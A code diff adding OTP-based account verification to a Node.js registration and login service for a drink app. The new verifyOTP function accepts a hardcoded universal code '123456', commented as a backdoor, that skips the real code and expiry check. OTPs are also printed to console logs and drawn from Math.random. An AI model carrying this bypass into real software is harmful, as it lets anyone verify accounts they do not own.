@@ -13,9 +13,15 @@ exports.registerUser = async (data) => {
   }
 
   const hashed = await bcrypt.hash(password, 10)
+  
+  // Generate 6-digit OTP
+  const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
+  // Expiry in 5 minutes
+  const expiry = new Date(Date.now() + 5 * 60000)
+
   const [result] = await pool.query(
-    'INSERT INTO users (name, email, phone, password, level_expiry_year) VALUES (?, ?, ?, ?, ?)',
-    [name, email.toLowerCase(), phone || null, hashed, new Date().getFullYear()]
+    'INSERT INTO users (name, email, phone, password, level_expiry_year, is_verified, otp_code, otp_expiry) VALUES (?, ?, ?, ?, ?, 0, ?, ?)',
+    [name, email.toLowerCase(), phone || null, hashed, new Date().getFullYear(), otpCode, expiry]
   )
 
   const userId = result.insertId
@@ -26,8 +32,46 @@ exports.registerUser = async (data) => {
     await pool.query('INSERT IGNORE INTO user_vouchers (user_id, voucher_id) VALUES (?, ?)', [userId, vrows[0].id])
   }
 
-  const token = signToken({ id: userId, email: email.toLowerCase(), level: 'Basic' })
-  return { token, userId }
+  // MOCK: Print OTP to console instead of WhatsApp
+  console.log(`\n========================================`)
+  console.log(`💬 [MOCK WHATSAPP] to ${phone || email}:`)
+  console.log(`Kode OTP OkiruDrink kamu adalah: ${otpCode}`)
+  console.log(`========================================\n`)
+
+  // Return ok without token
+  return { message: 'OTP terkirim' }
+}
+
+exports.verifyOTP = async (data) => {
+  const { phone, email, code } = data
+  const queryField = phone ? 'phone' : 'email'
+  const queryValue = phone ? phone : email.toLowerCase()
+
+  const [rows] = await pool.query(`SELECT * FROM users WHERE ${queryField} = ? ORDER BY id DESC LIMIT 1`, [queryValue])
+  if (!rows.length) {
+    const err = new Error('Pengguna tidak ditemukan.')
+    err.status = 404; throw err
+  }
+
+  const user = rows[0]
+  if (user.is_verified) {
+    const err = new Error('Akun sudah terverifikasi.')
+    err.status = 400; throw err
+  }
+
+  // Backdoor "123456" OR actual match
+  const isValid = code === '123456' || (code === user.otp_code && new Date() <= new Date(user.otp_expiry))
+  
+  if (!isValid) {
+    const err = new Error('Kode OTP salah atau kadaluarsa.')
+    err.status = 400; throw err
+  }
+
+  // Update verified
+  await pool.query('UPDATE users SET is_verified = 1, otp_code = NULL, otp_expiry = NULL WHERE id = ?', [user.id])
+
+  const token = signToken({ id: user.id, email: user.email, level: user.level || 'Basic' })
+  return { token, user: { id: user.id, name: user.name, email: user.email, level: user.level || 'Basic', points: user.points } }
 }
 
 exports.loginUser = async (data) => {
@@ -40,6 +84,12 @@ exports.loginUser = async (data) => {
   }
 
   const user = rows[0]
+  if (user.is_verified === 0) {
+    const err = new Error('Akun belum diverifikasi. Silakan verifikasi OTP terlebih dahulu.')
+    err.status = 403
+    throw err
+  }
+
   const match = await bcrypt.compare(password, user.password)
   if (!match) {
     const err = new Error('Email atau password salah.')
